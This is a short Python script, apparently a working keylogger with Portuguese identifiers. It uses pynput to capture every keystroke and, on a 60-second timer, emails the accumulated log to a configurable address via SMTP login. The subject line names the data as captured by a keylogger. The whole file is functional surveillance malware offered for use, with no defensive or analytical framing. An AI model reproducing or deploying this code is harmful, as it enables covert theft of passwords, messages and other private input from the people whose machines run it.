from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

EMAIL_DE_ORIGEM = "[EMAIL DE ORIGEM]"
EMAIL_DE_DESTINO = "[EMAIL DE DESTINO]"
SENHA_DO_EMAIL = "[SENHA DO EMAIL]"
HOST_DO_SERVIDOR_SMTP = "[HOST]"
PORTA = 587
log = " "

def enviar_email():
	global log 
	if log:
		msg = MIMEText(log)
		msg['SUBJECT'] = "Dados capturados pelo keylogger"
		msg['From'] = EMAIL_DE_ORIGEM
		msg['To'] = EMAIL_DE_DESTINO
	try:
		server = smtplib.SMTP(HOST_DO_SERVIDOR_SMTP,PORTA)
		server.starttls()
		server.login(EMAIL_DE_ORIGEM,SENHA_DO_EMAIL)
		server.send_message(msg)
		server.quit()
	except Exception as e:
		print("Erro ao enviar",e)
		
	log = " "
	
	Timer(60,enviar_email).start()

def on_press(key):
	global log
	try:
		log+= key.char
	except AttributeError:
		if key == keyboard.Key.space:
			log+=" "
		elif key == keyboard.Key.enter:
			log+="\n"
		elif key == keyboard.Key.backspace:
			log+="[<]"
		else:
			pass

with keyboard.Listener(on_press=on_press) as listener:
	enviar_email()
	listener.join()
